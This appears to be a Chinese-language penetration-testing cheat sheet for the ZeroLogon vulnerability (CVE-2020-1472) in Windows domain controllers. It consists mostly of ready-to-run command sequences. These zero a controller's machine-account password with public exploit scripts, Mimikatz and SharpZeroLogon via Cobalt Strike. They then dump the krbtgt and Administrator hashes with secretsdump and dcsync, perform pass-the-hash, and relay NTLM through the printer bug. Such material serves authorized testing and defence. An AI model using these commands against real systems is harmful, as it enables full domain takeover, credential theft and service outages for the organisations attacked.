# ZeroLogon

> CVE-2020-1472

**利用 (Exploitation)**:

1. 欺骗客户端凭据 (Spoofing the client credential)
2. 禁用签名和密封 (Disabling signing and sealing)
3. 欺骗调用 (Spoofing a call)
4. 将计算机的 AD 密码更改为空 (null)
5. 从密码更改到域管理员 (From password change to domain admin)
6. :warning: 以正确的方式重置计算机的 AD 密码以避免任何拒绝服务 (Deny of Service)

**工具 (Tools)**:

* `cve-2020-1472-exploit.py` - 来自 [dirkjanm](https://github.com/dirkjanm) 的 Python 脚本

```powershell
# 检查 (https://github.com/SecuraBV/CVE-2020-1472)
proxychains python3 zerologon_tester.py DC01 172.16.1.5

$ git clone https://github.com/dirkjanm/CVE-2020-1472.git

# 激活一个虚拟环境来安装 impacket
$ python3 -m venv venv
$ source venv/bin/activate
$ pip3 install .

# 利用 CVE (https://github.com/dirkjanm/CVE-2020-1472/blob/master/cve-2020-1472-exploit.py)
proxychains python3 cve-2020-1472-exploit.py DC01 172.16.1.5

# 查找 DC 的旧 NT 哈希
proxychains secretsdump.py -history -just-dc-user 'DC01$' -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 'CORP/DC01$@DC01.CORP.LOCAL'

# 从 secretsdump 恢复密码
# 在转储最新版本上的本地注册表机密时，secretsdump 将自动转储明文机器密码（十六进制编码）
python restorepassword.py CORP/DC01@DC01.CORP.LOCAL -target-ip 172.16.1.5 -hexpass e6ad4c4f64e71cf8c8020aa44bbd70ee711b8dce2adecd7e0d7fd1d76d70a848c987450c5be97b230bd144f3c3
deactivate
```

* `nccfsas` - 用于 Cobalt Strike execute-assembly 的 .NET 二进制文件

```powershell
git clone https://github.com/nccgroup/nccfsas
# 检查
execute-assembly SharpZeroLogon.exe win-dc01.vulncorp.local

# 重置机器帐户密码
execute-assembly SharpZeroLogon.exe win-dc01.vulncorp.local -reset

# 从未加入域的机器进行测试
execute-assembly SharpZeroLogon.exe win-dc01.vulncorp.local -patch

# 现在把密码重置回来
```

* `Mimikatz` - 2.2.0 20200917 Post-Zerologon

```powershell
privilege::debug
# 检查 CVE
lsadump::zerologon /target:DC01.LAB.LOCAL /account:DC01$

# 利用 CVE 并将计算机帐户的密码设置为 ""
lsadump::zerologon /target:DC01.LAB.LOCAL /account:DC01$ /exploit

# 执行 dcsync 以提取一些哈希
lsadump::dcsync /domain:LAB.LOCAL /dc:DC01.LAB.LOCAL /user:krbtgt /authuser:DC01$ /authdomain:LAB /authpassword:"" /authntlm
lsadump::dcsync /domain:LAB.LOCAL /dc:DC01.LAB.LOCAL /user:Administrator /authuser:DC01$ /authdomain:LAB /authpassword:"" /authntlm

# 使用提取出 Domain Admin 哈希进行哈希传递 (Pass The Hash)
sekurlsa::pth /user:Administrator /domain:LAB /rc4:HASH_NTLM_ADMIN

# 使用 IP 地址而不是 FQDN 以强制通过 Windows API 使用 NTLM 
# 将密码重置为 Waza1234/Waza1234/Waza1234/
# https://github.com/gentilkiwi/mimikatz/blob/6191b5a8ea40bbd856942cbc1e48a86c3c505dd3/mimikatz/modules/kuhl_m_lsadump.c#L2584
lsadump::postzerologon /target:10.10.10.10 /account:DC01$
```

* `netexec` - 仅检查

```powershell
netexec smb 10.10.10.10 -u username -p password -d domain -M zerologon
```
  
利用 zerologon 的第二种方法是通过身份验证中继完成的。

这项技术（[由 dirkjanm 发现](https://dirkjanm.io/a-different-way-of-abusing-zerologon)）需要更多的先决条件，但优点是不会对服务连续性产生影响。
需要以下先决条件：

* 一个域帐户
* 一个运行 `PrintSpooler` 服务的 DC
* 另一个存在 zerologon 漏洞的 DC

* `ntlmrelayx` - 来自 Impacket 和任何工具，如 [`printerbug.py`](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py)

```powershell
# 检查是否有一个 DC 正在运行 PrintSpooler 服务
rpcdump.py 10.10.10.10 | grep -A 6 "spoolsv"

# 在一个 shell 中设置 ntlmrelay
ntlmrelayx.py -t dcsync://DC01.LAB.LOCAL -smb2support

# 在第二个 shell 中触发 printerbug
python3 printerbug.py 'LAB.LOCAL'/joe:Password123@10.10.10.10 10.10.10.12
```

## 参考资料 (References)

* [Zerologon:Unauthenticated domain controller compromise by subverting Netlogon cryptography (CVE-2020-1472) - Tom Tervoort - September 15, 2020](https://web.archive.org/web/20200915011856/https://www.secura.com/pathtoimg.php?id=2055)
